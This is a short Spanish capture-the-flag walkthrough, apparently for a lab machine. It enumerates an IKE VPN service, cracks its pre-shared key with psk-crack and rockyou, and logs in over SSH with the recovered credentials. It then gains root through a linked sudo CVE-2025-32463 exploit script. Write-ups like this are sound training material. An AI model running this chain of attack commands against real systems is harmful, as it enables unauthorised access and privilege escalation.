
## Enumeración
Empezaremos realizando un escaneo con [[NMAP]] en el cual encontramos abierto el puerto `22/tcp` y el puerto `500/udp`
`nmap -sSCV -p- --open --min-rate 5000 -n -Pn -vvv <IP>`
`nmap -sU -p- --open --min-rate 5000 -n -Pn -vvv <IP>`

En el puerto `500` hay un servicio `ISAKMP Internet Security Association and Key Management Protocol`
Usaremos [[IKE-SCAN]] es una utilidad de línea de comandos para descubrir, identificar (fingerprint) y recopilar información de hosts que hablan IKE (Internet Key Exchange)

Ejecutaremos el siguiente comando:
`ike-scan --aggressive --pskcrack=psk.params`
`--aggresive` -> Envía identidades y parámetros en los primeros mensajes, sin esperar un handshake completo.
`--pskcrack` -> Captura el handshake en Aggressive Mode y lo guarda en `psk.params`

Usaremos [[PSK-CRACK]] Su objetivo principal es intentar adivinar la Pre-Shared Key (PSK)
`psk-crack -d /usr/share/wordlists/rockyou.txt psk.params`
Con `-d` seleccionaremos la wordlist y a continuación le pasaremos el archivo generado anteriormente.

Nos devolverá la password,(key):
`key "freakingrockstarontheroad" matches SHA1 hash 9acd999de926d953c088daf7b69efcfdecbd1893`

El hash lo guardamos en un fichero llamado hash.

Y usamos la herramienta de [[JOHN THE RIPPER]] con el siguiente comando:
`ikescan2john hash`

Y descubrimos que hay usuario `ike`

Accedemos a el por SSH con las credenciales `ike::freakingrockstarontheroad`

## Escalada de privilegios

Si ejecutamos `sudo -l` vemos que nos tenemos permisos de root para nada.
Vemos que la versión de sudo es vulnerable `sudo --version` vemos que es una `1.9.17p1` y que es vulnerable al `CVE-2025-32463`

Nos crearemos un fichero llamado `privesc.sh` y añadimos el repositorio de GitHub `https://github.com/Maalfer/Sudo-CVE-2021-3156/blob/main/CVE-2025-32463.sh`

Le damos permiso de ejecución con `chmod +x privesc.sh` y lo ejecutamos, nos dará una shell como root.

